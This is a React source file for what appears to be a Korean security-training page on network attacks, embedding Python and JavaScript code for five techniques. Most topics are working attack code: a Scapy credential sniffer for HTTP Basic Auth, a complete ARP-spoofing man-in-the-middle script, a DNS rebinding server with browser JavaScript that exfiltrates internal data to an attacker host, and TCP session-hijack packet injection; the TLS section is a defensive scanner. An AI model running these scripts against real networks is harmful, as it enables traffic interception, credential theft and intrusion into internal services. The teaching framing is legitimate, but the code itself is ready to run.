import SecurityLayout from './SecurityLayout'

const data = {
  icon: '🌐',
  title: '네트워크',
  desc: 'Scapy 패킷 크래프팅, ARP 스푸핑, TLS 분석, DNS 리바인딩, TCP 스택',
  stats: [
    { value: '5', label: '기법' },
    { value: 'Scapy', label: '주요 도구' },
    { value: 'L2-L7', label: '레이어' },
  ],
  topics: [
    {
      title: 'Scapy — 패킷 크래프팅 & 네트워크 스캐닝',
      difficulty: 'medium',
      tool: 'Scapy 2.5',
      explanation:
        'Scapy는 Python 기반 패킷 조작 라이브러리로, raw 소켓 수준에서 L2~L7 패킷을 자유롭게 생성·변조·주입·캡처할 수 있다. Nmap 수준의 스캐닝을 코드 몇 줄로 구현 가능하다.',
      code: `from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2  import ARP, Ether

# ── SYN 스캔 (포트 열림 여부 확인) ────────────
def syn_scan(target: str, ports: list) -> dict:
    results = {}
    pkts = [IP(dst=target)/TCP(dport=p, flags='S') for p in ports]
    ans, unans = sr(pkts, timeout=2, verbose=0)

    for sent, recv in ans:
        port  = sent[TCP].dport
        flags = recv[TCP].flags
        if flags == 'SA':            # SYN-ACK → 열림
            results[port] = 'open'
            # RST로 연결 종료 (half-open)
            send(IP(dst=target)/TCP(dport=port, flags='R'), verbose=0)
        elif flags == 'RA':          # RST-ACK → 닫힘
            results[port] = 'closed'

    for pkt in unans:
        results[pkt[TCP].dport] = 'filtered'

    return results

# ── OS Fingerprinting (TTL + Window Size) ────
def os_fingerprint(target: str) -> str:
    pkt = sr1(IP(dst=target)/ICMP(), timeout=2, verbose=0)
    if not pkt:
        return "No response"

    ttl    = pkt[IP].ttl
    window = pkt[TCP].window if TCP in pkt else 0

    if ttl <= 64:
        return f"Linux/Unix (TTL={ttl})"
    elif ttl <= 128:
        return f"Windows (TTL={ttl})"
    else:
        return f"Cisco/Network device (TTL={ttl})"

# ── 패킷 캡처 & 분석 ──────────────────────────
def capture_credentials(interface='eth0', count=100):
    """HTTP Basic Auth 크리덴셜 캡처"""
    def packet_handler(pkt):
        if Raw in pkt:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            if 'Authorization: Basic' in payload:
                import base64
                token = payload.split('Authorization: Basic ')[1].split('\\r')[0]
                decoded = base64.b64decode(token).decode()
                print(f"[!] Credentials: {decoded}")

    sniff(iface=interface, prn=packet_handler, count=count,
          filter='tcp port 80')

# ── 실행 ─────────────────────────────────────
# results = syn_scan('192.168.1.1', range(1, 1025))
# open_ports = [p for p,s in results.items() if s=='open']
# print(f"Open: {open_ports}")`,
    },
    {
      title: 'ARP Spoofing — MITM 구현',
      difficulty: 'hard',
      tool: 'Scapy + iptables',
      explanation:
        'ARP는 인증 없이 reply를 수락하므로, 게이트웨이와 피해자 양쪽에 가짜 ARP reply를 지속 전송하면 트래픽이 공격자를 경유하게 된다. IP 포워딩 활성화로 통신을 유지하면서 MITM 수행.',
      steps: [
        'echo 1 > /proc/sys/net/ipv4/ip_forward — 패킷 포워딩 활성화',
        '게이트웨이에게: "피해자 IP → 내 MAC"으로 ARP reply 전송',
        '피해자에게: "게이트웨이 IP → 내 MAC"으로 ARP reply 전송',
        '루프에서 주기적 재전송 (ARP 캐시 갱신 주기 대응)',
        'Scapy sniff()로 경유 트래픽 캡처',
      ],
      code: `from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import threading

def get_mac(ip: str) -> str:
    """ARP request로 MAC 주소 조회"""
    arp_req  = ARP(pdst=ip)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    pkt      = broadcast / arp_req
    ans, _   = srp(pkt, timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    raise ValueError(f"MAC not found for {ip}")

def poison(target_ip: str, spoof_ip: str, target_mac: str):
    """단방향 ARP 독화"""
    pkt = ARP(
        op      = 2,              # ARP reply
        pdst    = target_ip,      # 수신자
        hwdst   = target_mac,     # 수신자 MAC
        psrc    = spoof_ip,       # 사칭할 IP (게이트웨이)
        # hwsrc 미지정 → 자동으로 내 MAC 사용
    )
    send(pkt, verbose=0)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    """ARP 테이블 복원"""
    pkt = ARP(
        op    = 2,
        pdst  = target_ip,
        hwdst = target_mac,
        psrc  = spoof_ip,
        hwsrc = spoof_mac,
    )
    send(pkt, count=5, verbose=0)

def mitm_arp_spoof(victim_ip: str, gateway_ip: str, interval: float = 1.5):
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    print(f"[*] victim:  {victim_ip}  ({victim_mac})")
    print(f"[*] gateway: {gateway_ip}  ({gateway_mac})")
    print("[*] Poisoning... Ctrl+C to stop")

    try:
        while True:
            poison(victim_ip,  gateway_ip, victim_mac)   # 피해자에게
            poison(gateway_ip, victim_ip,  gateway_mac)  # 게이트웨이에게
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\\n[*] Restoring ARP tables...")
        restore(victim_ip,  gateway_ip, victim_mac,  gateway_mac)
        restore(gateway_ip, victim_ip,  gateway_mac, victim_mac)

# mitm_arp_spoof('192.168.1.100', '192.168.1.1')`,
    },
    {
      title: 'TLS 핸드셰이크 분석 & BEAST/POODLE 이해',
      difficulty: 'hard',
      cve: 'CVE-2011-3389 (BEAST) / CVE-2014-3566 (POODLE)',
      tool: 'Scapy / sslyze / openssl',
      explanation:
        'TLS 1.0의 CBC 모드는 IV가 이전 블록의 마지막 암호문이라 예측 가능하여 BEAST(선택 평문 공격)에 취약하다. SSL 3.0의 Padding은 검증이 부실하여 POODLE에 취약하다.',
      theory:
        'BEAST: TLS 1.0 CBC — IV = prev_ciphertext_block<br>공격자가 IV 예측 → chosen plaintext → XOR로 비교<br>─────────────────────────────────────────<br>POODLE: SSL 3.0 padding = 임의값<br>→ Padding Oracle 없이도 CBC 블록 반전으로 복호화',
      code: `#!/usr/bin/env python3
"""TLS 취약점 스캐너 — sslyze 래퍼"""
from sslyze import (
    Scanner, ServerNetworkLocation, ServerScanRequest,
    ScanCommand
)
from sslyze.errors import ConnectionToServerFailed

def scan_tls(hostname: str, port: int = 443):
    location = ServerNetworkLocation(hostname, port)
    request  = ServerScanRequest(
        server_location = location,
        scan_commands   = {
            ScanCommand.SSL_2_0_CIPHER_SUITES,
            ScanCommand.SSL_3_0_CIPHER_SUITES,
            ScanCommand.TLS_1_0_CIPHER_SUITES,
            ScanCommand.TLS_1_1_CIPHER_SUITES,
            ScanCommand.TLS_1_3_CIPHER_SUITES,
            ScanCommand.HEARTBLEED,
            ScanCommand.ROBOT,
            ScanCommand.TLS_COMPRESSION,         # CRIME
            ScanCommand.TLS_FALLBACK_SCSV,       # POODLE 방어
            ScanCommand.CERTIFICATE_INFO,
        }
    )
    scanner = Scanner()
    scanner.queue_scans([request])

    for result in scanner.get_results():
        if isinstance(result, ConnectionToServerFailed):
            print(f"[-] 연결 실패: {result.error_message}")
            continue

        # Heartbleed
        hb = result.scan_result.heartbleed
        if hb and hb.is_vulnerable_to_heartbleed:
            print(f"[!!!] HEARTBLEED 취약 — {hostname}")

        # ROBOT (RSA 패딩 오라클)
        robot = result.scan_result.robot
        if robot:
            print(f"[!] ROBOT: {robot.robot_result}")

        # 취약 프로토콜
        for proto_name, cmd in [
            ('SSL 2.0', result.scan_result.ssl_2_0_cipher_suites),
            ('SSL 3.0', result.scan_result.ssl_3_0_cipher_suites),
            ('TLS 1.0', result.scan_result.tls_1_0_cipher_suites),
        ]:
            if cmd and cmd.accepted_cipher_suites:
                print(f"[!] {proto_name} 지원됨 — POODLE/BEAST 위험")

# ── openssl 원라이너 ──────────────────────────
# openssl s_client -connect host:443 -ssl3        # SSL 3.0 테스트
# openssl s_client -connect host:443 -tls1        # TLS 1.0 테스트
# openssl s_client -connect host:443 -no_tls1_3   # TLS 1.3 비활성

# scan_tls('target.example.com')`,
    },
    {
      title: 'DNS Rebinding Attack',
      difficulty: 'expert',
      explanation:
        'DNS Rebinding은 브라우저의 Same-Origin Policy를 우회하는 공격이다. 악성 도메인의 DNS TTL을 매우 짧게 설정한 뒤, JavaScript 실행 중 DNS 응답을 내부 IP(127.0.0.1 등)로 교체하여 내부 서비스에 접근한다.',
      theory:
        '1. victim.attacker.com → 공격자 IP (짧은 TTL, 1초)<br>2. 브라우저가 공격자 JS 실행<br>3. TTL 만료 → victim.attacker.com → 127.0.0.1 재바인딩<br>4. JS가 victim.attacker.com으로 XHR → 내부 서비스 응답<br>5. SOP 우회 성공 — 내부 API 접근 가능',
      steps: [
        '공격자 도메인 DNS 서버 구성 (Singularity 또는 직접 구현)',
        'TTL=1초, 첫 응답: 공격자 IP / 이후 응답: 127.0.0.1',
        '피해자 방문 → 공격자 JS 실행 시작',
        'JS에서 타이밍 조절 후 동일 도메인으로 fetch() 재요청',
        '내부 서비스 응답을 공격자 서버로 exfiltrate',
      ],
      code: `#!/usr/bin/env python3
"""
DNS Rebinding 서버 — 교육용 PoC
최초 1회: 공격자 IP 반환
이후: 127.0.0.1 반환
"""
import socket
import struct
import threading
from collections import defaultdict

ATTACKER_IP = '1.2.3.4'    # 공격자 실제 IP
REBIND_IP   = '127.0.0.1'  # 리바인딩할 내부 IP
TTL         = 1              # 1초 TTL

visit_count = defaultdict(int)

def build_dns_response(query: bytes, ip: str) -> bytes:
    """최소 DNS 응답 패킷 구성"""
    tid    = query[:2]
    flags  = b'\\x81\\x80'           # Standard response, No error
    qcount = b'\\x00\\x01'
    acount = b'\\x00\\x01'
    header = tid + flags + qcount + acount + b'\\x00\\x00\\x00\\x00'

    # Question 섹션 그대로 복사 (QNAME + QTYPE + QCLASS)
    q_end = query.index(b'\\x00', 12) + 5
    question = query[12:q_end]

    # Answer RR
    answer = (
        b'\\xc0\\x0c'                # 이름 포인터 (question의 QNAME 참조)
        b'\\x00\\x01'                # Type A
        b'\\x00\\x01'                # Class IN
        + struct.pack('>I', TTL)     # TTL
        + b'\\x00\\x04'              # RDLENGTH = 4
        + socket.inet_aton(ip)       # IP 주소
    )
    return header + question + answer

def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))
    print("[*] DNS Rebinding server listening on :53")

    while True:
        data, addr = sock.recvfrom(512)
        client_key = addr[0]
        visit_count[client_key] += 1

        # 첫 방문 → 공격자 IP, 이후 → 리바인딩 IP
        if visit_count[client_key] <= 1:
            response_ip = ATTACKER_IP
            print(f"[*] {addr[0]} → {response_ip} (초기 바인딩)")
        else:
            response_ip = REBIND_IP
            print(f"[!] {addr[0]} → {response_ip} (리바인딩!)")

        resp = build_dns_response(data, response_ip)
        sock.sendto(resp, addr)

# ── 피해자 브라우저에서 실행될 JS ────────────
# (백틱 문자열은 JS 코드 예시이므로 단순 문자열로 표현)

// 공격자 서버에서 서빙하는 exploit.js
const domain = 'victim.attacker.com';

async function rebind_attack() {
  // 1단계: 현재 도메인으로 요청 (아직 공격자 IP)
  await fetch('http://' + domain + '/trigger');

  // TTL 만료 대기 (>1초)
  await new Promise(r => setTimeout(r, 2000));

  // 2단계: 재요청 → DNS 재조회 → 127.0.0.1 바인딩
  const resp = await fetch('http://' + domain + ':8080/api/secret');
  const data = await resp.text();

  // 3단계: 내부 데이터 외부 유출 (exfiltration)
  fetch('https://attacker.com/exfil?d=' + btoa(data));
}

rebind_attack();`,
    },
    {
      title: 'TCP 시퀀스 번호 예측 & Session Hijacking',
      difficulty: 'expert',
      cve: 'CVE-2001-0751 (Blind IP Spoofing)',
      tool: 'Scapy',
      explanation:
        '구형 OS의 TCP ISN(Initial Sequence Number)이 예측 가능할 때, 제3자가 스푸핑된 패킷을 삽입하여 세션을 하이재킹할 수 있다. 현대 OS는 랜덤 ISN을 사용하지만 off-path 공격에 여전히 유용하다.',
      theory:
        'TCP 3-way handshake:<br>Client → SYN(ISN_c) → Server<br>Server → SYN-ACK(ISN_s, ACK=ISN_c+1) → Client<br>Client → ACK(ACK=ISN_s+1) → Server<br>─────────────────────<br>ISN_s 예측 성공 → ACK=ISN_s+1 위조 가능',
      code: `from scapy.all import *
from scapy.layers.inet import IP, TCP
import random
import time

def probe_isn(target_ip: str, target_port: int, count: int = 5) -> list:
    """
    ISN 샘플링 — 예측 가능성 분석
    구형 시스템에서 ISN이 규칙적이면 다음 값 예측 가능
    """
    isns = []
    for i in range(count):
        sport = random.randint(1024, 65535)
        syn   = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags='S')
        resp  = sr1(syn, timeout=2, verbose=0)

        if resp and TCP in resp and resp[TCP].flags == 'SA':
            isn = resp[TCP].seq
            isns.append(isn)
            print(f"  ISN[{i}] = {isn}")

            # RST로 연결 종료
            rst = IP(dst=target_ip) / TCP(sport=sport, dport=target_port,
                                          flags='R', seq=resp[TCP].ack)
            send(rst, verbose=0)
        time.sleep(0.5)

    # ISN 차분 분석
    if len(isns) >= 2:
        diffs = [isns[i+1] - isns[i] for i in range(len(isns)-1)]
        print(f"\\n[*] ISN 차분: {diffs}")
        if len(set(diffs)) == 1:
            print(f"[!!!] ISN 완전 예측 가능! 증분 = {diffs[0]}")
        elif max(diffs) - min(diffs) < 1000:
            print(f"[!] ISN 예측 가능성 높음 (차분 범위: {min(diffs)}~{max(diffs)})")
        else:
            print("[+] ISN 랜덤 — 안전")

    return isns

def tcp_session_hijack(
    victim_ip: str, server_ip: str, server_port: int,
    victim_seq: int, victim_ack: int, inject_data: bytes
):
    """
    기존 TCP 세션에 스푸핑 패킷 삽입
    victim_seq, victim_ack: 캡처한 현재 시퀀스/ACK 번호
    """
    pkt = (
        IP(src=victim_ip, dst=server_ip) /
        TCP(
            sport = 12345,         # 피해자 포트
            dport = server_port,
            flags = 'PA',          # PSH + ACK
            seq   = victim_seq,
            ack   = victim_ack,
        ) /
        Raw(load=inject_data)
    )
    send(pkt, verbose=0)
    print(f"[*] 주입 완료: {inject_data!r}")

# ── 사용 예시 (교육 목적) ─────────────────────
# probe_isn('192.168.1.1', 22)`,
    },
  ],
}

export default function Network() {
  return <SecurityLayout data={data} />
}
